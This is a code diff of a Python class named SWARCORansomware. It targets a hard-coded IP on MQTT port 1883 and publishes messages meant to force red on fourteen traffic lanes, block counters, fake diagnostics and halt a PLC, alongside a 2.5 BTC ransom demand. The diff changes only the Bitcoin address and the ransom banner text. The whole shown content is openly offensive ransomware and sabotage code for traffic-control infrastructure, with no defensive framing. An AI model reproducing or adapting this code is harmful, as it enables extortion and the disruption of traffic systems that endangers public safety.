@@ -13,7 +13,7 @@ class SWARCORansomware:
         self.target_ip = "166.159.129.5"
         self.port = 1883
         self.op_name = "TRUSTEDF57"
-        self.btc_addr = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
+        self.btc_addr = "fucknomoneySUCCHIALO"
         self.ransom = "2.5 BTC"
         
         self.aes_key = b'TRUSTEDF57_SWARCO_MIL_K3Y_32BYT3S!!'
@@ -61,7 +61,7 @@ class SWARCORansomware:
                 "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S+00:00"),
                 "trigger_outputs": [{"traffic_triggers": [{"associated_lane": f"lane{i}", "FORCE_RED": True}], "trigger_output": 31+i} for i in range(1,15)]
             })},
-            {"topic": "traffic-statistic-output/sensor1", "payload": json.dumps({"MESSAGE": "🚨 TRUSTEDF57 HACKED 🚨", "BTC": self.btc_addr})},
+            {"topic": "traffic-statistic-output/sensor1", "payload": json.dumps({"MESSAGE": "🚨 TRUSTEDF57 GOVERNA 🚨", "BTC": self.btc_addr})},
             {"topic": "traffic-statistic-output/sensor2", "payload": json.dumps({"CONTATORI": "BLOCCATI", "PAGA": "2.5 BTC"})},
             {"topic": "comhub-diagnostics", "payload": json.dumps({"com_hub_cpu_temperature": 999, "STATUS": "MIL_LOCKOUT"})},
             {"topic": "plc-diagnostics", "payload": json.dumps({"operation_mode": 0, "HALT": "TRUSTEDF57"})}
